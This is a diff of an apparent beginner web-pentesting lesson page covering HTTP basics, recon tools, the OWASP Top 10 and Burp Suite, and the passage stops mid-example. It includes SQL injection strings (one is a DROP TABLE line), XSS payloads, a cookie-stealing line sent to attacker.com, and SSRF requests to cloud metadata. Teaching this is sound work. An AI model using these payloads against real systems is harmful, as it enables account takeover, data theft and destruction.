@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Web Application Attacks (L0) — Hack2Own</title>
-<meta name="description" content="Free L0 introduction to web application attacks. Part of the Hack2Own pentest curriculum." />
-<meta name="keywords" content="OWASP top 10, web security, SQL injection, XSS, web pentest, Hack2Own" />
-<link rel="canonical" href="https://hack2own.com/modules/web/l0.html" />
+<title>Web Application VAPT (L0) — Hack2Own</title>
+<meta name="description" content="Free L0 introduction to Web Application VAPT. Learn HTTP, the OWASP Top 10, Burp Suite, Gobuster, Nikto, and how to think like a web attacker. Part of the Hack2Own pentest curriculum." />
+<meta name="keywords" content="web application VAPT, burp suite, OWASP top 10, SQL injection, XSS, gobuster, nikto, web penetration testing, Hack2Own" />
+<link rel="canonical" href="https://hack2own.com/modules/webapp/l0.html" />
 <meta name="robots" content="index, follow" />
-<meta property="og:title" content="Web Application Attacks (L0) — Hack2Own" />
-<meta property="og:description" content="Free L0 introduction to web application attacks." />
-<meta property="og:url" content="https://hack2own.com/modules/web/l0.html" />
+<meta property="og:title" content="Web Application VAPT (L0) — Hack2Own" />
+<meta property="og:description" content="Free L0 introduction to Web Application VAPT." />
+<meta property="og:url" content="https://hack2own.com/modules/webapp/l0.html" />
 <meta property="og:image" content="https://hack2own.com/assets/img/og-cover.svg" />
 <meta property="og:type" content="article" />
 <link rel="icon" type="image/svg+xml" href="../../assets/img/favicon.svg" />
@@ -18,12 +18,18 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700;800&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="../../assets/css/style.css" />
+<style>
+  /* Offset anchor scroll position so headings aren't hidden behind the fixed navbar */
+  h2[id], h3[id] {
+    scroll-margin-top: 80px;
+  }
+</style>
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "Course",
-  "name": "Web Application Attacks (L0)",
-  "description": "Free L0 introduction to web application attacks.",
+  "name": "Web Application VAPT (L0)",
+  "description": "Free L0 introduction to Web Application Vulnerability Assessment and Penetration Testing.",
   "provider": { "@type": "EducationalOrganization", "name": "Hack2Own", "sameAs": "https://hack2own.com" },
   "isAccessibleForFree": true,
   "educationalLevel": "Beginner"
@@ -38,7 +44,7 @@
     <a href="../../index.html" class="brand"><span class="mark">H2O</span><span>Hack<b>2</b>Own</span></a>
 
     <!-- LEVEL SWITCHER -->
-    <div class="lvl-nav" data-module="web" data-level="0">
+    <div class="lvl-nav" data-module="webapp" data-level="0">
       <button class="lvl-btn lvl-prev" aria-label="Go shallow">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
         <span class="tip">Go Shallow</span>
@@ -55,7 +61,7 @@
       <li><a href="../../index.html#modules">Modules</a></li>
       <li><a href="../../pages/pricing.html">Pricing</a></li>
       <li><a href="../../pages/faq.html">FAQ</a></li>
-      <li><a href="../../pages/locked.html?module=web&level=1" class="btn btn-primary">Sign Up →</a></li>
+      <li><a href="../../pages/locked.html?module=webapp&level=1" class="btn btn-primary">Sign Up →</a></li>
     </ul>
   </div>
 </nav>
@@ -64,61 +70,596 @@
   <div class="lesson">
     <!-- SIDEBAR -->
     <aside class="lesson-side">
-      <h4>Module 03 · L0</h4>
+      <h4>Module 05 · L0</h4>
       <ul>
-        <li><a href="#intro" class="active">Why the web?</a></li>
-        <li><a href="#owasp">The OWASP Top 10</a></li>
-        <li><a href="#input">Input is the attack surface</a></li>
-        <li><a href="#wrap">Wrap-up</a></li>
+        <li><a href="#intro" class="active">What is Web App VAPT?</a></li>
+        <li><a href="#http">How the Web Works</a></li>
+        <li><a href="#recon">Recon &amp; Enumeration</a></li>
+        <li><a href="#vulns">The OWASP Top 10</a></li>
+        <li><a href="#burp">Burp Suite</a></li>
+        <li><a href="#wrap">Wrap-up &amp; Resources</a></li>
       </ul>
     </aside>
 
     <!-- CONTENT -->
     <article class="prose">
-      <span class="eyebrow">// module 03 · web</span>
-      <h1>Web Application Attacks</h1>
-      <p style="font-size:1.05rem;">Most breaches start in the browser. Web applications are sprawling, fast-changing, and exposed to the whole internet — which is exactly why they're where so many attacks begin.</p>
-      <h2 id="intro">Why the web?</h2>
-      <p>Web apps accept untrusted input from anyone, anywhere, and turn it into actions on a server. Every input is a question: "what happens if I send something the developer didn't expect?"</p>
-      <div class="callout"><strong>Mindset:</strong> Take it one phase at a time — each builds on the last.</div>
-      <h2 id="owasp">The OWASP Top 10</h2>
-      <p>The OWASP Top 10 is the industry's shorthand for the most common web weaknesses — injection, broken access control, misconfiguration, and more. At L0 you only need to recognise the categories and the idea behind each.</p>
-      <figure>
-        <img src="../../assets/img/placeholder.svg" alt="Diagram for Web Application Attacks" />
-        <figcaption>Drop your own diagram or screenshot here.</figcaption>
-      </figure>
-      <h2 id="input">Input is the attack surface</h2>
-      <p>Forms, URLs, headers, cookies, APIs — anywhere the app reads something you control is a place to test. The attacker's instinct: trust nothing the app claims, verify everything you can reach.</p>
-      <pre><code># Observe how an app responds to unexpected input (lab only)
-curl -i "https://lab.example/search?q=test"
-curl -i "https://lab.example/search?q=test'"   # does it break?
-# A different response can hint at how input is handled</code></pre>
-      <div class="callout warn"><strong>Stay legal:</strong> Practise only on intentionally-vulnerable labs (e.g. ones you host yourself). Testing real sites without permission is illegal.</div>
-      <h2 id="wrap">Wrap-up</h2>
-      <p>You now know why web apps are such a rich target, what the OWASP Top 10 represents, and why every input is a potential door. That's the surface of web hacking.</p>
+      <span class="eyebrow">// module 05 · web application</span>
+      <h1>Web Application VAPT</h1>
+      <p style="font-size:1.05rem;">Every login form, every search box, every URL parameter is a question the application is asking the world: <em>what will you send me?</em> Web Application VAPT is the discipline of answering that question the way an attacker would — before they get the chance to do it first.</p>
 
-      <!-- BUNDLE: buy all levels of THIS module -->
-      <div class="bundle">
-        <h3>
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3ef6a4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><path d="M3.27 6.96 12 12.01l8.73-5.05M12 22.08V12"/></svg>
-          Own this module — all levels
-        </h3>
-        <p style="font-size:.92rem;">Prefer one module à la carte instead of a full subscription? Bundle every depth of Web Application Attacks.</p>
-        <div class="rows">
-          <div class="row"><span>L1 · Apprentice (CEH-aligned theory)</span><span class="amt">₹2,000</span></div>
-          <div class="row"><span>L2 · Professional (hosted labs)</span><span class="amt">₹5,000</span></div>
-          <div class="row"><span>L3 · Expert (advanced labs)</span><span class="amt">₹7,500</span></div>
-        </div>
-        <div class="total">
-          <div>
-            <div style="font-family:var(--mono);font-size:.78rem;color:var(--fade);">Module bundle · all depths</div>
-            <div class="big">₹14,500</div>
-          </div>
-          <a href="../../pages/locked.html?module=web&level=1" class="btn btn-primary">Unlock the module →</a>
-        </div>
-      </div>
 
-      <p style="font-size:.85rem;color:var(--fade);">Use the <span class="accent-cyan">arrows in the navbar</span> to change depth — or sign up to unlock L1–L3.</p>
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="intro">What is Web Application VAPT?</h2>
+
+      <p>Picture this: a company has just launched a new customer portal. Tens of thousands of users sign up. Behind the login page sits a database with names, addresses, and payment records. Nobody tested it properly before go-live. Three weeks later, someone types a single quote (<code>'</code>) into the username field — and the entire database is theirs.</p>
+
+      <p>This is not a hypothetical. Variants of this scenario play out constantly across the industry. Web applications are the most attacked surface in modern computing, and the reason is simple: they are enormous, complex, and face the entire internet by default.</p>
+
+      <p><strong>Web Application VAPT</strong> — Vulnerability Assessment and Penetration Testing applied to web apps — is the proactive discipline of finding those weaknesses before the attacker does. Like its network counterpart, it splits into two phases:</p>
+
+      <p><strong>Vulnerability Assessment (VA)</strong> maps the application's attack surface — every endpoint, every input field, every third-party library — and checks it against known weaknesses. Automated tools do the heavy lifting here, but they miss things. That's where the second phase comes in.</p>
+
+      <p><strong>Penetration Testing (PT)</strong> picks up where VA leaves off. A tester actively tries to exploit what was found: can you actually log in as someone else? Can you extract data from the database? Can you run your own code on the server? The goal isn't just to find issues — it's to understand their real-world impact.</p>
+
+      <div class="callout"><strong>Web vs. Network VAPT:</strong> Network VAPT focuses on infrastructure — ports, services, protocols. Web App VAPT focuses on the application layer — everything that runs inside a browser. The two overlap (a web server is still a network service) but require different mindsets, different tools, and different vulnerability knowledge.</div>
+
+      <h3>Three testing perspectives</h3>
+      <p>Before starting any engagement, you define the testing approach based on what information you're given about the target:</p>
+
+      <pre><code>Black-box  – You know nothing: just a URL. Simulate a real external attacker.
+           Most realistic. Most time-consuming. Most blind spots.
+
+Grey-box   – You have limited info: user credentials, some documentation.
+           The most common real-world approach. Best balance of realism and depth.
+
+White-box  – Full access: source code, architecture diagrams, API specs.
+           Most thorough. Finds the deepest logic flaws. Used for code audits.</code></pre>
+
+      <p>The methodology across all three follows the same arc: <strong>Reconnaissance → Enumeration → Vulnerability Analysis → Exploitation → Reporting</strong>. This module covers the first four — the technical foundation you build everything else on.</p>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="http">How the Web Works</h2>
+
+      <p>Before you can break something, you need to understand how it's built. Web application security starts with HTTP — the protocol that every browser and web server speaks.</p>
+
+      <h3>The request-response cycle</h3>
+      <p>Every interaction with a web application is an HTTP conversation. Your browser sends a <strong>request</strong>; the server sends back a <strong>response</strong>. That's it. Everything — login forms, file uploads, API calls, password resets — is just shaped HTTP traffic. As a web app tester, you'll spend a large portion of your time reading, modifying, and replaying these conversations.</p>
+
+      <p>Here's a raw HTTP request — exactly what gets sent when you submit a login form:</p>
+
+      <pre><code>POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=abc123xyz
+Content-Length: 34
+
+username=alice&password=hunter2</code></pre>
+
+      <p>And the server's response:</p>
+
+      <pre><code>HTTP/1.1 302 Found
+Set-Cookie: session=newtoken987; HttpOnly; Secure; SameSite=Lax
+Location: /dashboard
+Content-Length: 0</code></pre>
+
+      <p>Even in these few lines, a tester sees a dozen questions worth asking. Is the redirect safe? Can the session token be predicted? What happens if you send this POST request twice? What happens if you change <code>username=alice</code> to <code>username=admin</code>? What if you remove the cookie entirely?</p>
+
+      <h3>HTTP methods</h3>
+      <p>Requests come in different <em>methods</em>, each semantically intended for a different operation. In practice, servers often don't enforce this properly — which creates opportunities:</p>
+
+      <pre><code>GET     – Retrieve a resource (parameters in the URL: /search?q=test)
+POST    – Submit data (parameters in the body: username=alice&pass=x)
+PUT     – Replace a resource (often used in REST APIs)
+DELETE  – Remove a resource
+PATCH   – Partially update a resource
+OPTIONS – Ask the server what methods it supports (useful for CORS recon)
+HEAD    – Like GET but response body is omitted (good for banner grabbing)</code></pre>
+
+      <div class="callout"><strong>HTTP verb tampering:</strong> Some applications check <em>whether</em> a user is logged in, but not <em>how</em> the request arrives. Changing a DELETE request to a POST, or vice versa, can sometimes bypass access controls entirely. Always test every endpoint with unexpected methods.</div>
+
+      <h3>Status codes — reading the application's mood</h3>
+      <p>HTTP status codes tell you what the server thought of your request. A tester reads them like a conversation:</p>
+
+      <pre><code>200 OK          – Request succeeded. Something is here.
+301/302         – Redirect. Note where it sends you — redirects can be manipulated.
+400 Bad Request – The server didn't like your input. You're probably close to something.
+401 Unauthorized– Authentication required. There's something worth protecting here.
+403 Forbidden   – You're authenticated but blocked. The resource exists — probe further.
+404 Not Found   – Nothing here. Or: the server is lying to hide it.
+500 Internal Error – You broke something. Often reveals stack traces and paths.
+503 Service Unavailable – Server overwhelmed. Useful to know for DoS context.</code></pre>
+
+      <p>A 500 error is often a gift. Stack traces leak technology names, file paths, database types, and library versions — all intelligence for the next phase of testing.</p>
+
+      <h3>Cookies and sessions</h3>
+      <p>HTTP is stateless: each request is independent. Web applications fake statefulness using <strong>sessions</strong> — the server creates a unique token for each logged-in user and stores it in a <strong>cookie</strong>, which the browser sends automatically with every subsequent request.</p>
+
+      <pre><code># A typical session cookie in a response header:
+Set-Cookie: PHPSESSID=f3a7b2c9d4e1; Path=/; HttpOnly; Secure; SameSite=Lax
+
+# What each flag means:
+HttpOnly  – JavaScript cannot read this cookie. Blocks one class of XSS attack.
+Secure    – Browser only sends this cookie over HTTPS. Blocks eavesdropping.
+SameSite  – Controls cross-site submission. Blocks most CSRF attacks.
+
+# What's missing from a badly configured cookie:
+Set-Cookie: session=user123; Path=/
+# No HttpOnly → XSS can steal it
+# No Secure → sent over plain HTTP
+# No SameSite → vulnerable to CSRF</code></pre>
+
+      <p>Whenever you see a cookie in a response, ask four questions: Is it HttpOnly? Is it Secure? Does it have SameSite? And — most importantly — can you predict or forge the token value?</p>
+
+      <h3>Security headers — the application's defensive posture</h3>
+      <p>Good web applications send security headers in every response. Their absence is a finding. Their misconfiguration is a finding. Checking for them takes thirty seconds and is always worth doing:</p>
+
+      <pre><code># Headers that should be present — check with curl:
+curl -I https://example.com
+
+# What to look for in the response:
+Strict-Transport-Security  – Forces HTTPS. Missing = possible downgrade attack.
+Content-Security-Policy    – Restricts script sources. Missing = XSS is easier.
+X-Frame-Options            – Prevents clickjacking. Missing = can be embedded in iframes.
+X-Content-Type-Options     – Stops MIME sniffing. Should be: nosniff
+Referrer-Policy            – Controls URL leakage in Referer header.
+
+# Headers that should NOT be present:
+Server: Apache/2.4.49      – Version disclosure. Attackers use this.
+X-Powered-By: PHP/7.2.0   – Same problem. Tells you what to attack.</code></pre>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="recon">Reconnaissance &amp; Enumeration</h2>
+
+      <p>Before you touch a single input field, you map the terrain. Web application recon is about understanding what's there — the tech stack, the endpoints, the forgotten corners — before deciding where to press.</p>
+
+      <h3>Passive recon: learning without touching</h3>
+      <p>Passive recon gathers intelligence without sending a single packet to the target. You're invisible to the server's logs:</p>
+
+      <pre><code># Google dorking — use Google's operators to find exposed things
+site:example.com                    # All indexed pages on the domain
+site:example.com filetype:pdf       # Exposed documents
+site:example.com inurl:admin        # Admin panel URLs
+site:example.com inurl:login        # Login pages
+"example.com" ext:sql               # Exposed SQL files (rare but catastrophic when found)
+intitle:"Index of" site:example.com # Open directory listings
+
+# WHOIS — ownership and registrar info
+whois example.com
+
+# Certificate transparency logs — find subdomains
+# Visit: https://crt.sh/?q=%.example.com
+# This reveals subdomains the target may have forgotten about
+
+# Shodan — find internet-facing infrastructure
+# Visit: https://shodan.io
+# Search: hostname:example.com
+# Reveals servers, open ports, banners — without touching the target</code></pre>
+
+      <div class="callout"><strong>Subdomains are gold.</strong> Companies often harden their main site but leave development, staging, or internal portals on subdomains like <code>dev.example.com</code>, <code>staging.example.com</code>, or <code>admin.example.com</code>. These tend to run older software, weaker auth, or be completely unprotected. Always enumerate subdomains.</div>
+
+      <h3>Technology fingerprinting with Wappalyzer</h3>
+      <p>Before exploiting an application, you need to know what it's built with. <strong>Wappalyzer</strong> is a browser extension that identifies frameworks, CMS platforms, JavaScript libraries, analytics tools, and server technology just by visiting a page. Install it from <a href="https://www.wappalyzer.com" target="_blank" rel="noopener">wappalyzer.com</a> — it's free and works instantly.</p>
+
+      <pre><code># Alternatively, read the response headers manually:
+curl -sI https://example.com | grep -i "server\|powered\|x-generator"
+
+# Common tech indicators:
+Server: nginx/1.18.0          → Nginx web server, version known
+X-Powered-By: PHP/8.1.2      → PHP backend, version known
+Set-Cookie: PHPSESSID=...    → PHP session handling
+Set-Cookie: JSESSIONID=...   → Java (Tomcat/Spring) backend
+Set-Cookie: csrftoken=...    → Django (Python) framework
+X-Generator: WordPress 6.4   → WordPress CMS</code></pre>
+
+      <p>Knowing the stack turns your testing from guesswork into precision. If you see WordPress, you know to check for vulnerable plugins. If you see PHP 7.2, you know it's end-of-life. If you see jQuery 1.x, you have a list of known XSS CVEs ready.</p>
+
+      <h3>Directory and file enumeration with Gobuster</h3>
+      <p><strong>Gobuster</strong> is a fast, Go-based tool that brute-forces directory and file names on a web server — trying thousands of common paths and seeing which ones exist. You'd be surprised how often targets expose <code>/admin</code>, <code>/backup</code>, <code>/.git</code>, or old config files just sitting there.</p>
+
+      <pre><code># Install on Kali Linux (usually pre-installed)
+sudo apt install gobuster
+
+# Basic directory scan
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
+
+# With file extensions — find PHP, HTML, backup, and text files too
+gobuster dir -u https://example.com \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt,bak,old,zip
+
+# Subdomain enumeration — find hidden subdomains
+gobuster dns -d example.com \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Filter noise — only show interesting status codes
+gobuster dir -u https://example.com -w wordlist.txt -s 200,301,302,403
+
+# Save results to file
+gobuster dir -u https://example.com -w wordlist.txt -o results.txt</code></pre>
+
+      <div class="callout"><strong>Wordlists matter:</strong> The best wordlist repository is <strong>SecLists</strong> by Daniel Miessler — <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">github.com/danielmiessler/SecLists</a>. It contains curated lists for directories, subdomains, usernames, passwords, fuzzing payloads, and more. Install it on Kali with <code>sudo apt install seclists</code> and it lands at <code>/usr/share/seclists/</code>.</div>
+
+      <h3>Automated vulnerability scanning with Nikto</h3>
+      <p><strong>Nikto</strong> is an open-source web server scanner that checks for thousands of known issues in minutes: outdated software, dangerous files, misconfigurations, missing headers, and default credentials. It's noisy (it will appear in logs) but invaluable for a quick first pass.</p>
+
+      <pre><code># Basic Nikto scan
+nikto -h https://example.com
+
+# Scan a specific port
+nikto -h example.com -p 8443
+
+# Scan with authentication (supply a session cookie)
+nikto -h https://example.com -C "sessionid=abc123"
+
+# Output to a file
+nikto -h https://example.com -o nikto_results.txt -Format txt
+
+# Tune the scan — only check specific categories
+# -Tuning 1 = interesting files, 4 = XSS, 5 = remote file retrieval
+nikto -h https://example.com -Tuning 145</code></pre>
+
+      <p>Nikto's output gives you a rapid baseline. Every line prefixed with <code>+</code> is a finding worth investigating manually. It won't catch everything — logic flaws, complex auth bypasses, and business logic vulnerabilities require human intuition — but it catches the obvious, quickly.</p>
+
+      <h3>A recon workflow</h3>
+      <p>Here's how the first 30 minutes of a web application engagement typically looks:</p>
+
+      <pre><code># 1. Fingerprint the technology stack
+curl -sI https://example.com | grep -i "server\|powered\|x-"
+# + open the site in a browser with Wappalyzer running
+
+# 2. Check security headers
+curl -sI https://example.com | grep -iE "strict|content-security|x-frame|x-content"
+
+# 3. Quick automated scan for obvious issues
+nikto -h https://example.com -o nikto_$(date +%Y%m%d).txt
+
+# 4. Enumerate directories and files
+gobuster dir -u https://example.com \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -x php,html,txt,bak -o gobuster_$(date +%Y%m%d).txt
+
+# 5. Find subdomains
+gobuster dns -d example.com \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -o subdomains_$(date +%Y%m%d).txt
+
+# 6. Review everything — mark what to probe manually next</code></pre>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="vulns">The OWASP Top 10</h2>
+
+      <p>The <strong>Open Web Application Security Project (OWASP)</strong> is the world's most authoritative voice on web application security. Their <strong>Top 10</strong> list — updated every few years based on real vulnerability data from thousands of applications — defines the most critical risk categories every web tester must understand. The current edition is the <a href="https://owasp.org/Top10/2021/" target="_blank" rel="noopener">OWASP Top 10:2021</a>.</p>
+
+      <p>This isn't just a checklist. Understanding <em>why</em> these vulnerabilities exist — the root cause — is what separates a tester who follows a script from one who finds things scripts miss.</p>
+
+      <h3>A01 — Broken Access Control</h3>
+      <p>The #1 vulnerability in 2021, found in 94% of tested applications. Access control answers the question: <em>is this user allowed to do this?</em> When it breaks, users can access resources or perform actions outside their intended permissions.</p>
+
+      <pre><code># Classic example: Insecure Direct Object Reference (IDOR)
+# Normal user views their own invoice:
+GET /invoices/1042
+
+# Tester changes the ID — does the server check ownership?
+GET /invoices/1041   # Someone else's invoice
+GET /invoices/1      # Admin's invoice?
+
+# If the server returns data without verifying ownership: that's IDOR.
+# Impact: data breach, unauthorised read/write, privilege escalation.
+
+# Another example: parameter manipulation
+POST /change-role
+{"userId": 99, "role": "user"}   # Normal request
+
+# Try:
+{"userId": 99, "role": "admin"}  # Can you promote yourself?</code></pre>
+
+      <h3>A02 — Cryptographic Failures</h3>
+      <p>Sensitive data — passwords, payment details, personal information — protected by weak or absent cryptography. The classic form is storing passwords in plain text or with MD5. But it also covers transmitting data over HTTP instead of HTTPS, or using weak random number generators for session tokens.</p>
+
+      <pre><code># Check if the site redirects HTTP to HTTPS:
+curl -I http://example.com
+# If you get 200 OK (not a 301/302 redirect to HTTPS): problem.
+
+# Check the TLS configuration:
+# Visit: https://www.ssllabs.com/ssltest/
+# An A+ rating means strong TLS. A C or F means exploitable.
+
+# Check for password storage issues (white-box):
+# Bad:   md5($password)         → rainbow tables crack this instantly
+# Bad:   sha1($password)        → same problem
+# OK:    bcrypt($password, 12)  → slow by design, safe
+# Best:  argon2id($password)    → the modern standard</code></pre>
+
+      <h3>A03 — Injection</h3>
+      <p>The most famous web vulnerability family. Injection happens when user-supplied input is passed directly to an interpreter — a database, a shell, an LDAP server — without being sanitised. The interpreter can't tell the difference between data and commands, so the attacker's input becomes code.</p>
+
+      <p><strong>SQL Injection</strong> is the classic example. The application builds a database query by concatenating user input:</p>
+
+      <pre><code># Vulnerable PHP code (don't write this):
+$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
+
+# Normal input: alice
+# Query becomes: SELECT * FROM users WHERE username = 'alice'
+
+# Attacker input: ' OR '1'='1
+# Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
+# This returns ALL rows — authentication bypassed.
+
+# Even worse: ' ; DROP TABLE users; --
+# Query becomes: SELECT * FROM users WHERE username = ''; DROP TABLE users; --
+# Table gone.
+
+# Testing for SQLi: add a single quote to any input field or URL parameter
+https://example.com/product?id=5'
+# If the page errors or behaves differently: potentially injectable.
+
+# Common SQLi test payloads:
+'
+''
+`
+')
+'))
+' OR '1'='1
+' OR 1=1--
+1' ORDER BY 1--
+1' ORDER BY 2--   # Increase until error — reveals column count</code></pre>
+
+      <div class="callout warn"><strong>Never test SQLi on live production databases</strong> without explicit written permission. Even read-only payloads can trigger WAF alerts, lock accounts, or slow down queries enough to cause service disruption. Always use dedicated test environments or authorised lab targets.</div>
+
+      <p><strong>Cross-Site Scripting (XSS)</strong> is JavaScript injection. The attacker injects a script into a page that gets executed by other users' browsers:</p>
+
+      <pre><code># Reflected XSS: input reflected directly in the response
+# Normal URL: https://example.com/search?q=shoes
+# Page shows: "Results for: shoes"
+
+# Attacker URL: https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+# If unfiltered, the page executes the script in the victim's browser.
+
+# What attackers actually do with XSS:
+# Steal session cookies: document.location='https://attacker.com/?c='+document.cookie
+# Redirect to phishing page
+# Keylog credentials
+# Perform actions as the victim (CSRF via XSS)
+
+# Stored XSS is worse: the payload is saved in the database
+# and executes for every user who views the page.
+# Example: a comment field that doesn't sanitise input.
+
+# Testing for XSS: try these payloads in every input field:
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;</code></pre>
+
+      <h3>A05 — Security Misconfiguration</h3>
+      <p>Found in nearly 90% of applications tested. This is the broadest category — it covers everything from default credentials on admin panels to verbose error messages to directory listing being left on. It's not a single bug; it's a posture failure.</p>
+
+      <pre><code># Common things to check:
+# Default credentials on admin panels (try admin/admin, admin/password)
+https://example.com/admin
+https://example.com/wp-admin         # WordPress
+https://example.com/administrator   # Joomla
+https://example.com/phpmyadmin      # Database panel
+
+# Directory listing enabled (you can see all files in a folder)
+https://example.com/uploads/        # Should return 403, not a file list
+
+# Debug mode left on in production
+https://example.com/debug
+https://example.com/?XDEBUG_SESSION_START=1
+
+# Exposed configuration files
+https://example.com/.env            # Contains DB passwords, API keys
+https://example.com/web.config      # Windows/IIS config
+https://example.com/config.php.bak  # Backup of config file
+
+# Version disclosure via headers (seen in recon phase)
+# Allows targeted CVE searches</code></pre>
+
+      <h3>A07 — Identification and Authentication Failures</h3>
+      <p>Broken authentication covers a range of weaknesses in how users prove who they are and how those sessions are managed. It's often the difference between "this site is secure" and "I'm logged in as every user simultaneously."</p>
+
+      <pre><code># Common authentication issues to test:
+
+# 1. No rate limiting on login — brute force is possible
+# Try 100 wrong passwords. Does the account lock? Does the response time change?
+
+# 2. Username enumeration — does the error message differ?
+# Bad: "No account found for alice@example.com" (confirms alice exists)
+# Good: "Invalid email or password" (says nothing)
+
+# 3. Weak password policy — test with common passwords
+# Try: password, 123456, admin, the company name
+
+# 4. Insecure "forgot password" flow
+# Is the reset token guessable? Does it expire? Does it work after use?
+
+# 5. Session not invalidated on logout
+# Log in → copy session cookie → log out → paste cookie in new tab
+# If you're still authenticated: the server never invalidated the token.</code></pre>
+
+      <h3>A10 — Server-Side Request Forgery (SSRF)</h3>
+      <p>A newer addition to the Top 10 that has become increasingly critical in cloud environments. SSRF tricks the server into making HTTP requests on your behalf — often to internal services that are not publicly accessible.</p>
+
+      <pre><code># The vulnerability: an application fetches a URL you supply
+# Intended use: "Enter a URL and we'll preview the webpage"
+POST /fetch
+{"url": "https://external-site.com/image.jpg"}
+
+# Attacker use: supply an internal address
+{"url": "http://169.254.169.254/latest/meta-data/"}
+# This hits the AWS EC2 metadata endpoint — may return IAM credentials!
+
+{"url": "http://localhost:6379"}   # Probe internal Redis
+{"url": "http://10.0.0.5:8080"}   # Reach internal services
+
+# Indicators of potential SSRF:
+# URL parameters: ?url=, ?redirect=, ?endpoint=, ?feed=
+# Features: webhooks, PDF generators, image fetchers, link previewers</code></pre>
+
+      <div class="callout"><strong>The full OWASP Top 10:2021:</strong> A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable and Outdated Components · A07 Identification &amp; Authentication Failures · A08 Software and Data Integrity Failures · A09 Security Logging &amp; Monitoring Failures · A10 Server-Side Request Forgery. Learn all ten at <a href="https://owasp.org/Top10/2021/" target="_blank" rel="noopener">owasp.org/Top10/2021</a>.</div>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="burp">Burp Suite</h2>
+
+      <p>If there is one tool you invest time in as a web application tester, it is <strong>Burp Suite</strong>. Created by PortSwigger, it is the industry-standard platform for web security testing — a complete workbench that sits between your browser and the application, letting you intercept, inspect, modify, replay, and automate every HTTP request and response. The free <strong>Community Edition</strong> has enough power to get you well into your security journey.</p>
+
+      <p>Download it from <a href="https://portswigger.net/burp/communitydownload" target="_blank" rel="noopener">portswigger.net</a>. The PortSwigger team also runs the <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">Web Security Academy</a> — the best free web security learning platform in existence, with hundreds of interactive labs built around real vulnerabilities.</p>
+
+      <h3>Setting up Burp as a proxy</h3>
+      <p>Burp works by acting as a proxy between your browser and the internet. You configure your browser to send all traffic through Burp, and Burp lets you see (and control) everything that passes through.</p>
+
+      <pre><code># Step 1: Launch Burp Suite → Temporary Project → Use Burp Defaults
+
+# Step 2: Configure your browser
+# Burp listens on 127.0.0.1:8080 by default
+# In Firefox: Settings → Network Settings → Manual Proxy
+# HTTP Proxy: 127.0.0.1   Port: 8080
+# Check "Use this proxy server for all protocols"
+# (FoxyProxy extension makes this easier — highly recommended)
+
+# Step 3: Install Burp's CA Certificate (for HTTPS interception)
+# With Burp running, visit: http://burpsuite in your browser
+# Click "CA Certificate" to download it
+# Firefox: Settings → Privacy & Security → Certificates → View Certificates
+# → Authorities → Import → select the downloaded certificate
+# Check "Trust this CA to identify websites" → OK
+
+# Step 4: Test it
+# Go to Proxy → Intercept → turn Intercept ON
+# Visit any website in your browser
+# Burp should catch the request — you'll see it frozen in the Intercept tab
+# Click "Forward" to release it</code></pre>
+
+      <h3>The core tools</h3>
+      <p>Burp is not one tool — it is a suite. Here are the components you'll use most:</p>
+
+      <pre><code">Proxy     – The heart of Burp. Intercepts every request/response in real time.
+            See exactly what your browser sends, modify it before it leaves.
+
+HTTP History – Logs all traffic that passed through the proxy (even when
+            intercept is off). Your audit trail and research library.
+
+Repeater  – Pick any request, modify it, send it again. Instantly. Endlessly.
+            This is the tool you'll use most for manual testing.
+            Tweak a parameter, hit Send, see the response. Repeat.
+
+Intruder  – Automates request modification with payloads from a wordlist.
+            Use it for brute-forcing login forms, fuzzing parameters,
+            or testing every entry in a list of XSS payloads.
+            (Community Edition is rate-limited — still useful)
+
+Decoder   – Encode and decode data in URL, Base64, HTML, hex formats.
+            Essential when parameters are encoded and you need to read or
+            modify them.
+
+Scanner   – Automated vulnerability scanner. Pro edition only, but powerful.
+            Community Edition has limited passive scanning.</code></pre>
+
+      <h3>Your first manual test with Repeater</h3>
+      <p>Repeater is where manual web app testing happens. Here's the workflow for testing a login form for SQL injection:</p>
+
+      <pre><code># 1. In your browser (with Burp Proxy running), submit the login form normally
+#    username: testuser   password: testpass
+
+# 2. In Burp → Proxy → HTTP History, find the POST /login request
+#    Right-click → Send to Repeater
+
+# 3. In the Repeater tab, you'll see the raw request:
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
